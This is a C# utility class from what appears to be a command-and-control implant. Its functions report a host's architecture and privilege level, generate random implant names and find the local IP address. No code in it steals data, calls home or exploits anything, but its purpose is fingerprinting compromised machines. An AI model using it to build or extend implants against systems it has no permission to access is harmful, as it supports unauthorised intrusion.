using System;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Principal;

namespace Implant.Utils
{
    public class ImplantDataUtils
    {
        public static string ReturnArch() {
            var arch = IntPtr.Size == 8 ? "x64" : "x86";
            return arch;
        }

        public static string ReturnIntegrity() {

            var id = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(id);
            var integrity = "Medium";

            if (id.IsSystem) { integrity = "SYSTEM"; }
            else if (principal.IsInRole(WindowsBuiltInRole.Administrator)) { integrity = "High"; }

            id.Dispose();
            return integrity;
        }

        public static Random random = new Random();
        const string chars = "abcdefghijklmnopqrstuvwxyz0123456789";

        public static string GenImplantName() { return new string(Enumerable.Repeat(chars, 8).Select(s => s[random.Next(s.Length)]).ToArray()); }

        public static string GetHostIP()
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, 0))
            {
                socket.Connect("8.8.8.8", 65530);
                IPEndPoint endPoint = socket.LocalEndPoint as IPEndPoint;
                return (endPoint.Address.ToString());
            }
        }
    }
}
